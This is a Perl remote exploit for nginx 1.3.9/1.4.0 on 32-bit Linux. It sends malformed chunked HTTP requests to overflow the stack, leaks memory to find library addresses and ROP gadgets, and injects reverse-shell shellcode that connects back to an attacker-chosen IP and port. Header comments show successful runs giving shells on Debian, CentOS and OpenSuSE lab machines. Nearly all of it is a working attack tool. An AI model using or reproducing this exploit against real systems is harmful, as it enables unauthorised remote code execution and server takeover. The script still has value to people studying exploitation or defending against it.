#nginx 1.3.9/1.4.0 x86 brute force remote exploit
# copyright (c) 2013 kingcope
#----------------------------
#fix for internet exploitation, set MTU:
#ifconfig <interface> mtu 60000 up
#
###
# !!! WARNING !!! 
# this exploit is unlikely to succeed when used against remote internet hosts.
# the reason is that nginx uses a non-blocking read() at the remote connection,
# this makes exploitation of targets on the internet highly unreliable.
# (it has been tested against a testbed on the internet but I couldn't exploit
# any other box with it. required was the above ifconfig setting on the client.
# maybe enabling large tcp frame support on a gigabit connection is more
# useful)
# so use it inside intranets only (duh!), this remains a PoC for now :D
# The exploit does not break stack cookies but makes use of a reliable method
# to retrieve all needed offsets for Linux x86 and pop a shell.
###
#TODO
#*cleanup code
#*implement stack cookie break and amd64 support
#*support proxy_pass directive
###
=for comment
TARGET TESTS (Debian, Centos, OpenSuSE)

1. Debian 7
perl ngxunlock.pl 192.168.27.146 80 192.168.27.146 443
Testing if remote httpd is vulnerable % SEGV %
YES %
Finding align distance (estimate)
testing 5250 align  % SEGV %
testing 5182 align  % SEGV %
Verifying align
Finding align distance (estimate)
testing 5250 align  % SEGV %
testing 5182 align  % SEGV %
Finding write offset, determining exact align
testing 0x08049c50, 5184 align  % SURVIVED %
Extracting memory \
bin search done, read 20480 bytes
exact align found 5184
Finding exact library addresses
trying plt 0x08049a32, got 0x080bc1a4, function 0xb76f4a80  % FOUND exact ioctl 0x08049a30 %
trying plt 0x08049ce2, got 0x080bc250, function 0xb773e890  % FOUND exact memset 0x08049ce0 %
trying plt 0x08049d52, got 0x080bc26c, function 0xb76f8d40  % FOUND exact mmap64 0x08049d50 %
Found library offsets, determining mnemonics
trying 0x0804ed2d  % SURVIVED %
exact large pop ret 0x0804a7eb
exact pop x3 ret 0x0804a7ee
bin search done |
See reverse handler for success

nc -v -l -p 443
listening on [any] 443 ...
192.168.27.146: inverse host lookup failed: Unknown host
connect to [192.168.27.146] from (UNKNOWN) [192.168.27.146] 34778
uname -a;id;
Linux dakkong 3.2.0-4-686-pae #1 SMP Debian 3.2.46-1 i686 GNU/Linux
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
cat /etc/debian_version
7.1

2. CentOS 6.4
perl ngxunlock.pl 192.168.27.129 80 192.168.27.129 443
Testing if remote httpd is vulnerable % SEGV %
YES %
Finding align distance (estimate)
testing 5250 align  % SEGV %
testing 5194 align  % SEGV %
Verifying align
Finding align distance (estimate)
testing 5250 align  % SEGV %
testing 5194 align  % SEGV %
Finding write offset, determining exact align
testing 0x08049990, 5200 align  % SURVIVED %
Extracting memory /
bin search done, read 20480 bytes
exact align found 5200
Finding exact library addresses
trying plt 0x080499f2, got 0x080b31ac, function 0x0094a6b0  % FOUND exact memset 0x080499f0 %
trying plt 0x08049b52, got 0x080b3204, function 0x008f1fd0  % FOUND exact ioctl 0x08049b50 %
trying plt 0x08049f12, got 0x080b32f4, function 0x008f72c0  % FOUND exact mmap64 0x08049f10 %
Found library offsets, determining mnemonics
trying 0x0804e9d4  % SURVIVED %
exact large pop ret 0x0806194d
exact pop x3 ret 0x0804a832
bin search done /
See reverse handler for success

nc -v -l 443
Connection from 192.168.27.129 port 443 [tcp/https] accepted
uname -a;id;
Linux localhost.localdomain 2.6.32-358.el6.i686 #1 SMP Thu Feb 21 21:50:49 UTC 2013 i686 i686 i386 GNU/Linux
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
cat /etc/redhat*
CentOS release 6.4 (Final)

3. OpenSuSE 12.1
perl ngxunlock.pl 192.168.27.135 80 192.168.27.135 443
Testing if remote httpd is vulnerable % SEGV %
YES %
Finding align distance (estimate)
testing 5250 align  % SEGV %
testing 5182 align  % SEGV %
Verifying align
Finding align distance (estimate)
testing 5250 align  % SEGV %
testing 5182 align  % SEGV %
Finding write offset, determining exact align
testing 0x08049a18, 5184 align  % SURVIVED %
Extracting memory \
bin search done, read 20480 bytes
exact align found 5184
Finding exact library addresses
trying plt 0x08049a6a, got 0x080be08c, function 0xb75f74f0  % FOUND exact memset 0x08049a68 %
trying plt 0x08049b8a, got 0x080be0d4, function 0xb764b160  % FOUND exact ioctl 0x08049b88 %
trying plt 0x08049eea, got 0x080be1ac, function 0xb76501e0  % FOUND exact mmap64 0x08049ee8 %
Found library offsets, determining mnemonics
trying 0x0804ea7f  % SURVIVED %
exact large pop ret 0x0804a7fa
exact pop x3 ret 0x0804a101
bin search done -
See reverse handler for success

Connection from 192.168.27.135 port 443 [tcp/https] accepted
uname -a;id;
Linux linux-01xg 3.1.0-1.2-desktop #1 SMP PREEMPT Thu Nov 3 14:45:45 UTC 2011 (187dde0) i686 i686 i386 GNU/Linux
uid=65534(nobody) gid=65533(nobody) groups=65533(nobody),65534(nogroup)

cat /etc/SuSE-*
openSUSE
VERSION = 12.1
openSUSE 12.1 (i586)
VERSION = 12.1
CODENAME = Asparagus
=cut

use IO::Socket;

if ($#ARGV < 3) {
print "nginx remote exploit\n";
print "copyright (c) 2013 kingcope\n";
print "usage: $0 <target> <target port> <reverse ip> <reverse port>\n";
exit;
}

$target = $ARGV[0];
$targetport = $ARGV[1];
$cbip = $ARGV[2];
$cbport = $ARGV[3];

#linux reverse shell by bighawk
$lnxcbsc =
"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b"   
."\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x68"
."\x7f\x7f\x7f\x7f" # IP
."\x66\x68" . "\xb0\xef" # PORT
."\x66\x6a\x02\x89\xe1\x6a\x10\x51\x50\x89\xe1\x89\xc6\x6a\x03\x5b\x6a\x66"
."\x58\xcd\x80\x87\xf3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xd2"   
."\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

($a1, $a2, $a3, $a4) = split(//, gethostbyname("$cbip"));
substr($lnxcbsc, 31, 4, $a1 . $a2 . $a3 . $a4);

($p1, $p2) = split(//, reverse(pack("s", $cbport)));
$p1 = chr(ord($p1));
$p2 = chr(ord($p2));
substr($lnxcbsc, 37, 2, $p1 . $p2);

$|=1;
$uri="";
###test target vulnerable
#XXX
#$k = 0x80498d0;
#$align2 = 5200;
#$alignplus=0;
#goto debug;

print "Testing if remote httpd is vulnerable ";
$uritested = 0;
test:
goto l;
connecterr:
if ($j==0) {
	print "\nDestination host unreachable\n";
	exit;
}
goto again;
l:
for ($j=0;$j<15;$j++) {
again:
		$sock = IO::Socket::INET->new(PeerAddr => $target,
                                  PeerPort => $targetport,
                                  Proto    => 'tcp') || {goto connecterr};                                  
		setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
		$req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
                   ."Connection: close\r\n"
                   ."Transfer-Encoding:chunked\r\n\r\n";
		$req .= "0" x (1024-length($req)-16) . "8000000000003770";
		$stack = pack("V", 0xc0debabe);
		twinkle();		
		print $sock $req;
		send($sock, "A" x (5555-1024) . $stack, MSG_OOB);
                $l = read($sock, $buffer, 0x10);
		close($sock);
		twinkle();

		if ($buffer =~ /HTTP\/1.1/) {
			next;
		}
		if ($l <= 0) {
			print "% SEGV %\n";
			print "YES %\n";
			goto yes;
		}	
}

if ($uritested == 0) {
	$uri = "50x.html";
	$uritested=1;
	goto test;
}
print "\n\\\\ NO %\n";
print "\\\\ Try to increase client MTU with ifconfig <interface> mtu 60000 up\n\n\\\\ Debug output\n";
$sock = IO::Socket::INET->new(PeerAddr => $target,
                              PeerPort => $targetport,
                              Proto    => 'tcp') || {goto connecterr};                                  
setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
$req = "GET / HTTP/1.1\r\nHost: $target\r\n"
      ."Connection: keep-alive\r\n"
      ."Transfer-Encoding:chunked\r\n\r\n";
$req .= "0" x (1024-length($req)-16) . "8000000000003770";
$stack = pack("V", 0xc0debabe);
print $sock $req;
send($sock, "A" x (5555-1024) . $stack, MSG_OOB);
$line = 0;
while(<$sock>) {
	print;
	if ($line > 30) {
		last;
	}
}
exit;
###find align
$verifyalign = 0;
yes:
print "Finding align distance (estimate)\n";
for ($align=4050;$align<6000;$align+=100) {
for ($j=0;$j<15;$j++) {
		printf("testing %d align ",$align); 
again0_1:
#		$sock = IO::Socket::INET->new(PeerAddr => $target,
 #                                 PeerPort => $targetport,
  #                                Proto    => 'tcp') || {goto again0_1};
#		setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
#		$req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
 #                  ."Connection: close\r\n\r\n";
#		print $sock $req;
#		close($sock);

		$sock = IO::Socket::INET->new(PeerAddr => $target,
                                  PeerPort => $targetport,
                                  Proto    => 'tcp') || {goto again0_1};
		setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
		$req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
                   ."Connection: keep-alive\r\n"
                   ."Transfer-Encoding:chunked\r\n\r\n";
		$req .= "0" x (1024-length($req)-16) . "8000000000003770";
		$stack = pack("V", 0xc0debabe);
		print $sock $req;
		send($sock, "A" x ($align-1024) . $stack, MSG_OOB);
                $l = read($sock, $buffer, 0x10);
		twinkle();
		close($sock);
		
		if ($l <= 0) {
			if ($align == 4050) {
				goto out;
			}
			print " % SEGV %\n";
			$alignstart = $align-100;
			goto incalign;
		}
		print "\r\r\r\r";
		if ($buffer =~ /HTTP\/1.1/) {
			next;
		}
       	close($sock);
}
}
out:
print "\n\\\\ Align not found\n";
exit;

incalign:
for ($align=$alignstart;$align<6000;$align++) {
for ($j=0;$j<7;$j++) {
		printf("testing %d align ",$align); 
again0_2:
#		$sock = IO::Socket::INET->new(PeerAddr => $target,
 #                                 PeerPort => $targetport,
  #                                Proto    => 'tcp') || {goto again0_2};
#		setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
#		$req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
 #                  ."Connection: close\r\n\r\n";
#		print $sock $req;
#		close($sock);

		$sock = IO::Socket::INET->new(PeerAddr => $target,
                                  PeerPort => $targetport,
                                  Proto    => 'tcp') || {goto again0_2};
		setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
		$req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
                   ."Connection: keep-alive\r\n"
                   ."Transfer-Encoding:chunked\r\n\r\n";
		$req .= "0" x (1024-length($req)-16) . "8000000000003770";
		$stack = pack("V", 0xc0debabe);
		print $sock $req;
		send($sock, "A" x ($align-1024) . $stack, MSG_OOB);
        $l = read($sock, $buffer, 0x10);
		twinkle();
		close($sock);
		if ($l <= 0) {
			print " % SEGV %\n";
			if ($verifyalign == 0) {
				print "Verifying align\n";
				$verifyalign = $align;
				goto yes;
			}

			if (($align > $verifyalign + 4) || ($align < $verifyalign - 4))  {
				print "\\\\ Align and verfied align do not match\n";
				exit;
			}

			if ($verifyalign < $align) {
				$align = $verifyalign;
			}

			goto begin;
		}
		print "\r\r\r\r";

		if ($buffer =~ /HTTP\/1.1/) {
			next;
		}
       	close($sock);
}
}
print "\n\\\\ could not find align value. bailing out";
exit;
###find write offset
begin:
print "Finding write offset, determining exact align\n";
$align2 = $align;
$ok = 0;
#for ($k=0x8049d30;$k<=0x0804FFFF;$k+=4) {
for ($k=0x08049800;$k<=0x0804FFFF;$k+=4) {
#for ($k=0x0804dc00;$k<=0x0804FFFF;$k+=4) {	
for ($alignplus=0;$alignplus<7;$alignplus++) {
debug:
for ($j=0;$j<10;$j++) {
		if (pack("V", $k) =~ /\x20/) {
			next;
		}
		$align = $align2 + $alignplus;
		printf("testing 0x%08x, %d align ",$k,$align); 
again1:
#		if ($ok==0) {
#		$sock = IO::Socket::INET->new(PeerAddr => $target,
 #                                 PeerPort => $targetport,
  #                                Proto    => 'tcp') || {goto again1};
#		setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
#		$req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
 #                  ."Connection: close\r\n\r\n";
#		print $sock $req;
#		close($sock);
#		}
		$sock = IO::Socket::INET->new(PeerAddr => $target,
                                  PeerPort => $targetport,
                                  Proto    => 'tcp') || {goto again1};
		setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
		$req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
                   ."Connection: keep-alive\r\n"
                   ."Transfer-Encoding:chunked\r\n\r\n";
		$req .= "0" x (1024-length($req)-16) . "8000000000003770";
#		$k = 0x8049e30; #XXX
		$stack = pack("V", $k) # write plt assumed,eg 0x804ab6c
				. "ZZZZ" # crash dummy
				. "\x03\x00\x00\x00" # write file descriptor
				. pack("V", $k-0x1000) # write buffer
				. "\xff\xff\xf0\x00"; # write size
		#$p = <stdin>;
		print $sock $req;
		if ($ok == 0) {
		send($sock, "A" x ($align-1024) . $stack . "A" x 1000, MSG_OOB);
		} else {
		send($sock, "A" x ($align-1024) . $stack . "A" x 500, MSG_OOB);
		}
		$l = read($sock, $buffer, 0x5000);
		twinkle();
		close($sock);
#0x8049c50

		if ($buffer =~ /HTTP\/1.1/) {
			if ($ok == 0) {
				print "\r\r\r\r";
				next;
			} else {
				goto again1;
			}
		}

		if ($ok == 1 && length($buffer) < 0x2000) {
			goto again1;
		}

		if (length($buffer) > 350) {
			if ($ok == 0) {
				$ok = 1;
				print " % SURVIVED %\n";
				print("Extracting memory ");
				goto again1;
			}			
			print "\nbin search done, ";
			printf("read %d bytes\n", $l); 
			goto hit;
		}		           
		print "\r\r\r\r";
}
}
}	
print "\n\\\\unable to get write offset\n";
exit;
hit:
printf("exact align found %d\n", $align);
print "Finding exact library addresses\n";
$write = $k;
$writeless = $write-0x1000;
### find offsets for mmap64, memset and ioctl
$mmap64 = "";
$ioctl = "";
$memset = "";
$mmap64_prefix =
"\x55\x53\x56\x57\x8b\x54\x24\x28"
."\x8b\x4c\x24\x2c\xf7\xc2\xff\x0f"
."\x00\x00\x75";
$ioctl_prefix =
"\x53\x8b\x54\x24\x10\x8b\x4c\x24"
."\x0c\x8b\x5c\x24\x08\xb8\x36\x00"
."\x00\x00";
$memset_prefix =
"\x53\x8b\x4c\x24\x10\x0f\xb6\x44"
."\x24\x0c\x88\xc4\x89\xc2\xc1\xe0"
."\x10\x09\xd0\x8b\x54\x24\x08\x83";
$memset_prefix2 =
"\xfc\x57\x8b\x54\x24\x08\x8b\x4c"
."\x24\x10\x0f\xb6\x44\x24\x0c\xe3"
."\x2c\x89\xd7\x83\xe2\x03\x74\x11";
$memset_prefix3 =
"\x57\x8b\x7c\x24\x08\x8b\x54\x24"
."\x10\x8a\x44\x24\x0c\x88\xc4\x89"
."\xc1\xc1\xe0\x10\x66\x89\xc8\xfc";
$memset_prefix4 =
"\x55\x89\xe5\x57\x56\x83\xec\x04".
"\x8b\x75\x08\x0f\xb6\x55\x0c\x8b".
"\x4d\x10\x89\xf7\x89\xd0\xfc\x83";

$buffer2 = $buffer;
$buffer3 = $buffer;
plt_again:
$buffer2 = $buffer3;
for(;;) {
	$i = index($buffer2, "\xff\x25");
	if ($i >= 0) {
		if (($j = index($buffer3, substr($buffer2, $i, 50))) <= 0) {
			$buffer2 = substr($buffer2, $i+2);
			next;
		}
		$buffer2 = substr($buffer2, $i+2);
		$address = $writeless + $j;
		### delve into library function
		printf "trying plt 0x%08x, ", ($address+2);
again2:
		$sock = IO::Socket::INET->new(PeerAddr => $target,
		                          PeerPort => $targetport,
		                          Proto    => 'tcp') || {goto again2};
                setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
                $req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
                   ."Connection: keep-alive\r\n"
                   ."Transfer-Encoding:chunked\r\n\r\n";
                $req .= "0" x (1024-length($req)-16) . "8000000000003770";
				$stack = pack("V", $write) # write plt
				. "ZZZZ" # crash dummy
				. "\x03\x00\x00\x00" # write file descriptor
				. pack("V", $address+2) # write buffer
				. "\x00\x03\x00\x00"; # write size
                print $sock $req;
		send($sock, "A" x ($align-1024) . $stack . "A" x 1000, MSG_OOB);		

                $l = read($sock, $buffer, 0x300);
                if ($buffer =~ /HTTP\/1.1/) {
                        goto again2;
                }
                if ($l == 0x300) {
			$gotentry = unpack("V", substr($buffer,0,4));
			if ($gotentry == 0) {
			print "\r\r\r\r";
			next;
			}
                        close($sock);
                } else {
			close($sock);
			goto again2;
		}
				
		printf "got 0x%08x, ", $gotentry;
again3:
		$sock = IO::Socket::INET->new(PeerAddr => $target,
		                          PeerPort => $targetport,
		                          Proto    => 'tcp') || {goto again3};

                setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
                $req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
                   ."Connection: keep-alive\r\n"
                   ."Transfer-Encoding:chunked\r\n\r\n";
                $req .= "0" x (1024-length($req)-16) . "8000000000003770";
		$stack = pack("V", $write) # write plt
				. "ZZZZ" # crash dummy
				. "\x03\x00\x00\x00" # write file descriptor
				. pack("V", $gotentry) # write buffer
				. "\x00\x03\x00\x00"; # write size
                print $sock $req;
		send($sock, "A" x ($align-1024) . $stack . "A" x 1000, MSG_OOB);		

                $l = read($sock, $buffer, 0x300);
		close($sock);
                if ($buffer =~ /HTTP\/1.1/) {
			goto again3;
                }
                if ($l == 0x300) {
			$function = unpack("V", substr($buffer,0,4));
                } else {
			goto again3;
		}
		if ($function == 0) {
		print "\r\r\r\r";
		next;
		}

		printf "function 0x%08x ", $function;
again4:
		$sock = IO::Socket::INET->new(PeerAddr => $target,
		                          PeerPort => $targetport,
		                          Proto    => 'tcp') || {goto again4};

                setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
                $req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
                   ."Connection: keep-alive\r\n"
                   ."Transfer-Encoding:chunked\r\n\r\n";
                $req .= "0" x (1024-length($req)-16) . "8000000000003770";
		$stack = pack("V", $write) # write plt
				. "ZZZZ" # crash dummy
				. "\x03\x00\x00\x00" # write file descriptor
				. pack("V", $function) # write buffer
				. "\xff\xff\xf0\x00"; # write size
                print $sock $req;
		send($sock, "A" x ($align-1024) . $stack . "A" x 1000, MSG_OOB);		

                #$p = <stdin>;
                $l = read($sock, $buffer, 0x500);
                close($sock);
                if ($buffer =~ /HTTP\/1.1/) {
			goto again4;
                }
                if ($l != 0x500) {
			goto again4;
		}
		###		
		
		if (substr($buffer, 0, length($mmap64_prefix)) eq
			$mmap64_prefix) {
			$mmap64 = $address;
			printf(" %% FOUND exact mmap64 0x%08x %%\n", $mmap64);
		}
		if ((substr($buffer, 0, length($memset_prefix)) eq
			$memset_prefix) or 
		    (substr($buffer, 0, length($memset_prefix2)) eq
			 $memset_prefix2) or
		    (substr($buffer, 0, length($memset_prefix3)) eq
			 $memset_prefix3) or
		    (substr($buffer, 0, length($memset_prefix4)) eq
			 $memset_prefix4)) {
			$memset = $address;
			printf(" %% FOUND exact memset 0x%08x %%\n", $memset);
		}
		if (substr($buffer, 0, length($ioctl_prefix)) eq
			$ioctl_prefix) {
			$ioctl = $address;
			printf(" %% FOUND exact ioctl 0x%08x %%\n", $ioctl);
		}
		
		if (($mmap64 ne "") and ($memset ne "") and ($ioctl ne "")) {		
			goto gotplt;
		}
		print "\r\r\r\r";
	} else {
		last;
	}
}
print "\nFinding exact library addresses\n";
goto plt_again;
gotplt:
print "Found library offsets, determining mnemonics\n";
### find pop pop pop ret
### to set socket blocking
for ($k=$write + 0x5000;;$k++) {
		printf("trying 0x%08x ",$k); 
again5:
		$sock = IO::Socket::INET->new(PeerAddr => $target,
                                  PeerPort => $targetport,
                                  Proto    => 'tcp') || {goto again5};
                setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
                $req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
                   ."Connection: keep-alive\r\n"
                   ."Transfer-Encoding:chunked\r\n\r\n";
                $req .= "0" x (1024-length($req)-16) . "8000000000003770";
				$stack = pack("V", $ioctl)
				. pack("V", $k) # pop pop pop ret assumed
				. "\x03\x00\x00\x00"
				. "\x21\x54\x00\x00"
				. "\x08\x80\x04\x08" # null byte
				. pack("V", $write) # write plt found
				. "ZZZZ" # crash dummy
				. "\x03\x00\x00\x00" # write file descriptor
				. pack("V", $write) # write buffer
				. "\xff\xff\x0f\x00"; # write size
                print $sock $req;
		send($sock, "A" x ($align-1024) . $stack . "A" x 1000, MSG_OOB);		

                #$p = <stdin>;
		$l = read($sock, $buffer, 0xfffff);
		close($sock);
		twinkle();
		if ($buffer =~ /HTTP\/1.1/) {
                        again5;
                }

		if ($l  > 0xfff) {
			print " % SURVIVED %\n";
			close($sock);
			goto hit2;
		}
		print "\r\r\r\r";
                next;
}
hit2:
###send attack buffer
###find largepopret
@matches = $buffer =~ /(\x83\xc4\x20[\x58\x5b\x59\x5a\x5e\x5f\x5d][\x58\x5b\x59\x5a\x5e\x5f\x5d][\x58\x5b\x59\x5a\x5e\x5f\x5d]\xc3)/g;
foreach $m (@matches) {
	$i = index($buffer, $m);
	twinkle();
	print "\r";
	if ($i >= 0) {
		$__largepopret = $write + $i;
		printf("exact large pop ret 0x%08x\n", $__largepopret);
		goto hit3;
	}
}
print "\\\\ large pop ret not found\n";
exit;
hit3:
###find poppoppopret
@matches = $buffer =~ /([\x58\x5b\x59\x5a\x5e\x5f\x5d][\x58\x5b\x59\x5a\x5e\x5f\x5d][\x58\x5b\x59\x5a\x5e\x5f\x5d]\xc3)/g;
foreach $m (@matches) {
	$i = index($buffer, $m);
	if ($i >= 0) {
		$__poppoppopret = $write + $i;
		printf("exact pop x3 ret 0x%08x\n", $__poppoppopret);
		goto attack;
	}
}
print "\\\\ poppoppopret not found\n";
exit;
attack:			  
$largepopret = pack("V", $__largepopret);
$popblock = "\x00\x00\x00\x00"
	   ."\x00\x00\x00\x00"
	   ."\x00\x00\x00\x00"
	   ."\x00\x00\x00\x00";
$popret = pack("V", $__poppoppopret+2);
$poppoppopret = pack("V", $__poppoppopret);
$pop3ret = $__poppoppopret;

$copycode = "\xfc\x8b\xf4\xbf\x00\x01\x00\x10\xb9\x00\x02\x00\x00\xf3\xa4"
		   ."\xeb\xff";
$memsetcode = "";
$copyaddress = 0x10000000;
for ($i=0;$i<length($copycode);$i++) {
	$byte = substr($copycode, $i, 1);
	$memsetcode .= pack("V", $memset)
        		 . pack("V", $pop3ret)
        		 . pack("V", $copyaddress)
        		 . $byte . "\x00\x00\x00"
        		 . "\x01\x00\x00\x00";
	$copyaddress++;
}
for ($q=0;$q<10;$q++) {
print "bin search done ";
sleep(1);
twinkle();
print "\r"
}
print "\n";
print "See reverse handler for success\n";
again6:
$sock = IO::Socket::INET->new(PeerAddr => $target,
                          PeerPort => $targetport,
                          Proto    => 'tcp') || {goto again6};
setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);
$req = "HEAD /$uri HTTP/1.1\r\nHost: $target\r\n"
      ."Connection: close\r\n"
      ."Transfer-Encoding:chunked\r\n\r\n";
$req .= "0" x (1024-length($req)-16) . "8000000000003770";
$stack = pack("V", $mmap64)
	. $largepopret
 	."\x00\x00\x00\x10" # mmap start
 	."\x00\x10\x00\x00" # mmap size
 	."\x07\x00\x00\x00" # mmap prot
 	."\x32\x00\x00\x00" # mmap flags
 	."\xff\xff\xff\xff" # mmap fd
 	."\x00\x00\x00\x00" # mmap offset
 	."\x00\x00\x00\x00" # mmap offset
 	. $popblock
 	. $memsetcode
	. "\x00\x00\x00\x10" # JUMP TO 0x10000000 (rwxp addr)
	. "\x90" x 100 . $lnxcbsc;
#$p = <stdin>;
print $sock $req;
send($sock, "A" x ($align-1024) . $stack . "A" x 1000, MSG_OOB);		
close($sock);

goto again6; # XXX
my $current = 0; 
sub twinkle { 
$cursors[0] = "|";
$cursors[1] = "/";
$cursors[2] = "-";
$cursors[3] = "\\";
print "$cursors[$current++]\b";
if ($current > 3) {
	$current = 0;
} 
}

